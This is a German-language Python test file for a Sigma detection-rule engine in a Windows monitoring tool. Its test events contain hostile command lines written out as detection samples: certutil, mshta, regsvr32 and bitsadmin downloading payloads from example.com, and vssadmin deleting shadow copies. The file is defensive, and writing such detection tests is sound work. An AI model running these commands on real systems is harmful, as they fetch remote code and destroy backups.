"""Sigma-Leser der Wache: Modifikatoren, Bedingungen, unbekannte Felder werden nicht geladen, mitgelieferte
Regeln treffen das Muster und nicht den Alltag."""
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
for _d in ("core", "engines", "tools", "ui"):
    if str(ROOT / _d) not in sys.path:
        sys.path.insert(0, str(ROOT / _d))

import yaml                                                                    # noqa: E402
from wache import ereignisse as E, regeln as R, sigma as S                    # noqa: E402


def start(exe: str, cmd: str = "", eltern: str = "explorer.exe", nutzer: str = "user") -> E.Ereignis:
    return E.Ereignis(E.PROZESS, "process_start", "Start", prozess=exe.split("\\")[-1], exe=exe, cmdline=cmd,
                      eltern=eltern, nutzer=nutzer)


def regel(detection: str) -> S.SigmaRegel:
    return S.regel_aus(yaml.safe_load(
        "title: T\nid: t-1\nlevel: high\nlogsource: {category: process_creation, product: windows}\n"
        "detection:\n" + detection))


class VergleichTests(unittest.TestCase):
    def test_modifikatoren(self):
        r = regel("  a:\n    CommandLine|contains|windash: '-enc'\n  condition: a\n")
        self.assertTrue(S.trifft(r, start(r"C:\x\p.exe", "p.exe /enc AAA")))
        self.assertTrue(S.trifft(r, start(r"C:\x\p.exe", "p.exe -ENC AAA")))          # ohne cased: egal
        r = regel("  a:\n    CommandLine|contains|all: ['delete', 'shadows']\n  condition: a\n")
        self.assertTrue(S.trifft(r, start(r"C:\x\v.exe", "v delete shadows /all")))
        self.assertFalse(S.trifft(r, start(r"C:\x\v.exe", "v delete")))
        r = regel("  a:\n    CommandLine|re: 'x[0-9]+y'\n  condition: a\n")
        self.assertTrue(S.trifft(r, start(r"C:\x\p.exe", "a x42y b")))
        r = regel("  a:\n    Image: 'C:\\*\\tool?.exe'\n  condition: a\n")
        self.assertTrue(S.trifft(r, start(r"C:\Prog\tool1.exe")))
        r = regel("  a:\n    ParentImage|endswith: '\\winword.exe'\n  condition: a\n")
        self.assertTrue(S.trifft(r, start(r"C:\x\cmd.exe", eltern="WINWORD.EXE")))

    def test_bedingungen(self):
        r = regel("  sel_a:\n    Image|endswith: '\\a.exe'\n  sel_b:\n    CommandLine|contains: 'x'\n"
                  "  filter:\n    User: 'system'\n  condition: (1 of sel_*) and not filter\n")
        self.assertTrue(S.trifft(r, start(r"C:\t\a.exe")))
        self.assertTrue(S.trifft(r, start(r"C:\t\b.exe", "mit x")))
        self.assertFalse(S.trifft(r, start(r"C:\t\a.exe", nutzer="SYSTEM")))
        r = regel("  s1:\n    Image|endswith: '\\a.exe'\n  s2:\n    CommandLine|contains: 'x'\n"
                  "  condition: all of them\n")
        self.assertFalse(S.trifft(r, start(r"C:\t\a.exe")))
        self.assertTrue(S.trifft(r, start(r"C:\t\a.exe", "x")))

    def test_unbekanntes_wird_nicht_geladen(self):
        with self.assertRaises(S.Unbekannt):
            regel("  a:\n    Hashes|contains: 'MD5='\n  condition: a\n")                # Feld fehlt der Wache
        with self.assertRaises(S.Unbekannt):
            regel("  a:\n    CommandLine|base64offset|contains: 'x'\n  condition: a\n")
        with self.assertRaises(S.Unbekannt):
            S.regel_aus({"logsource": {"category": "network_connection"}, "detection": {"a": {}, "condition": "a"}})


class LadenTests(unittest.TestCase):
    def test_ordner_und_kaputte_datei(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp)
            (d / "gut.yml").write_text(
                "title: Eigene\nid: eigen-1\nlogsource: {category: process_creation, product: windows}\n"
                "detection:\n  a:\n    Image|endswith: '\\\\eigen.exe'\n  condition: a\n", encoding="utf-8")
            (d / "kaputt.yml").write_text("title: [unvollständig", encoding="utf-8")
            (d / "anders.yml").write_text(
                "title: Netz\nlogsource: {category: network_connection}\ndetection:\n  a: {DestinationPort: 1}\n"
                "  condition: a\n", encoding="utf-8")
            regeln, weg = S.laden(d)
        self.assertIn("eigen-1", [r.kennung for r in regeln])
        self.assertEqual(len(S.laden(None)[0]) + 1, len(regeln))
        self.assertEqual(2, len(weg))


class MitgelieferteTests(unittest.TestCase):
    def setUp(self):
        self.regeln = {r.kennung: r for r in S.laden(None)[0]}

    def test_treffen_das_muster(self):
        faelle = {
            "nemicli-sigma-001": start(r"C:\Windows\System32\certutil.exe",
                                       "certutil -urlcache -split -f http://example.com/a.exe a.exe"),
            "nemicli-sigma-002": start(r"C:\Windows\System32\mshta.exe", "mshta https://example.com/x.hta"),
            "nemicli-sigma-003": start(r"C:\Windows\System32\regsvr32.exe",
                                       "regsvr32 /s /n /u /i:http://example.com/x.sct scrobj.dll"),
            "nemicli-sigma-004": start(r"C:\Windows\System32\rundll32.exe", 'rundll32 javascript:"\\..\\x"'),
            "nemicli-sigma-005": start(r"C:\Windows\System32\bitsadmin.exe",
                                       "bitsadmin /transfer job http://example.com/a C:\\a"),
            "nemicli-sigma-006": start(r"C:\Windows\System32\vssadmin.exe", "vssadmin delete shadows /all /quiet"),
        }
        for kennung, e in faelle.items():
            self.assertTrue(S.trifft(self.regeln[kennung], e), kennung)

    def test_alltag_trifft_nichts(self):
        alltag = [start(r"C:\Windows\System32\certutil.exe", "certutil -hashfile a.iso SHA256"),
                  start(r"C:\Windows\System32\rundll32.exe", "rundll32 shell32.dll,Control_RunDLL"),
                  start(r"C:\Windows\System32\vssadmin.exe", "vssadmin list shadows"),
                  start(r"C:\Program Files\App\app.exe", "app --url https://example.com")]
        for e in alltag:
            self.assertEqual([], [k for k, r in self.regeln.items() if S.trifft(r, e)], e.cmdline)

    def test_umbenanntes_werkzeug_ueber_originalnamen(self):
        e = start(r"C:\Users\user\x.exe", "x -urlcache -f https://example.com/a a")
        self.assertTrue(S.trifft(self.regeln["nemicli-sigma-001"], e, lambda _p: "certutil.exe"))


class RegelwerkTests(unittest.TestCase):
    def test_alarm_mit_regel_und_prozess_als_subjekt(self):
        rw = R.Regelwerk()
        with mock.patch("wache.herkunft.originalname", return_value=""):
            alarme = [a for a in rw.pruefen(start(r"C:\Windows\System32\vssadmin.exe", "vssadmin delete shadows"))
                      if a.regel == "SIGMA"]
        self.assertEqual(1, len(alarme))
        self.assertEqual("nemicli-sigma-006 · vssadmin.exe", alarme[0].subjekt)
        self.assertEqual(E.Schwere.HOCH, alarme[0].schwere)
        self.assertIn("T1490", alarme[0].text)
        self.assertIn("SIGMA", R.MENGENREGELN)                    # eine Regel, die hier harmlos ist, darf leiser werden


if __name__ == "__main__":
    unittest.main()
